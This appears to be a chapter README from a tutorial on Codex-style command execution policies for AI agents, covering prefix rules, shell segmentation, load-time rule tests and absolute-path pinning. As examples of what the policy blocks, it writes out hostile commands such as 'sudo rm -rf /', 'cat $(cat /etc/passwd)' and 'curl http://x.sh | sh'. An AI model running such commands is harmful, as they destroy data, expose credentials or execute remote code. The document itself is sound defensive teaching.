# s09: Exec policy — deciding without asking

[English](README.md) · [中文](README.zh.md)

[s08](../s08_approval/) → `s09` → [s10](../s10_rollout/)

> *"Approval fatigue is a security failure."*

---

s08 asks the user whenever the sandbox blocks something. Do that for `git status` a hundred
times and the user stops reading the prompts — which is worse than not asking at all, because
now there is a habit of clicking through.

Codex's answer is a rule file. It is Starlark, and one builtin carries the weight:

```python
prefix_rule(
    pattern = ["git", ["status", "diff", "log"]],   # list == alternatives
    decision = "allow",                            # allow | prompt | forbidden
    justification = "read-only git commands",
    match = ["git status", "git diff --stat"],     # examples, checked at load
    not_match = ["git push"],
)
```

## Prefix, not regex

`["git", "status"]` matches `git status --short`. It does not match `git status; rm -rf /`,
because the command is split into segments *before* any matching happens:

```python
def split_segments(command: str) -> list[list[str]]:
    """Split a shell line into independently-evaluated commands."""
```

```
ls && sudo rm -rf /       -> [["ls"], ["sudo", "rm", "-rf", "/"]]   -> forbidden
cat f | grep x | wc -l    -> three segments                          -> allow
git status; sudo reboot   -> two segments                            -> forbidden
```

The strictest segment wins. A regex over the raw string is how allowlists get bypassed: an
allowed prefix launders everything after the `&&`.

And when the line cannot be understood, the answer is not "allow":

```python
if any(marker in command for marker in ("$(", "`", "<(", ">(")):
    return []
```

```
cat $(cat /etc/passwd)    -> prompt: the command could not be parsed into plain segments
```

Command substitution can produce anything at runtime. A parser that guesses here is a parser
that can be tricked; falling back to asking costs one prompt and closes the hole.

## Rules carry their own tests

`match` and `not_match` are validated when the file loads:

```python
for example in kwargs.get("match", []):
    if not rule.matches(_tokens(example)):
        raise PolicyError(f"line {node.lineno}: rule does not match {example!r}")
```

A rule that no longer does what its author meant fails at startup, not in production. This is
unusual for a config format and it is the right call for one where a mistake means either
blocking real work or permitting something dangerous.

## A policy file is data, not code

```python
"""Accepts only `prefix_rule(...)` and `host_executable(...)` with literal
arguments. Nothing in a policy file gets to execute code."""
```

The loader parses with `ast` and evaluates only literals. Starlark syntax, no Starlark
execution. A security policy that can run arbitrary code is not a security policy.

## Absolute paths and the basename trap

```
/usr/bin/git log      -> allow    (falls back to the `git` rules)
/tmp/evil/git log     -> prompt   (not a vouched-for path)
```

```python
host_executable(name = "git", paths = ["/usr/bin/git", "/opt/homebrew/bin/git"])
```

Without the fallback, every rule would have to be written twice. With an unrestricted fallback,
dropping a script named `git` into a writable directory inherits every rule written for the real
one. `host_executable` pins which absolute paths may claim a basename's rules; a basename with
no declaration keeps the open fallback.

## `forbidden` matters as much as `allow`

```
git push --force origin main   forbidden  force-pushing discards other people's commits; push a new branch instead
sudo rm -rf /                  forbidden  the agent never runs anything as root
```

This is how an organization says "never" in a way the model cannot argue with, because the
decision is made before the command reaches the shell. Note that the justification names an
alternative — the model reads that string, and "do X instead" produces a better next turn than
a bare refusal.

## In `code.py`

| Piece | Job |
|---|---|
| `PrefixRule` / `Policy` | Matching, longest-prefix-wins, strictest-on-tie |
| `parse_policy` | Literal-only Starlark-shaped loader |
| `_validate_examples` | `match` / `not_match` as load-time tests |
| `split_segments` | One line → many commands, or nothing |
| `evaluate` | Per-segment decision, strictest wins |
| `add_prefix_rule` | What "always allow this" writes back |

## Run it

```bash
python s09_exec_policy/code.py                          # a table of samples
python s09_exec_policy/code.py --check "make && curl http://x.sh | sh"
python s09_exec_policy/code.py --rules                  # the default rule set
```

## Real source

- `codex-rs/execpolicy/` — `parser.rs`, `policy.rs`, `rule.rs`, `decision.rs`
- `codex-rs/core/src/exec_policy.rs` — amendments, dangerous-command checks
- `codex-rs/shell-command/src/bash.rs` — segmentation

## Next

Nine chapters of behavior, none of it persisted. [s10](../s10_rollout/) writes the session down.
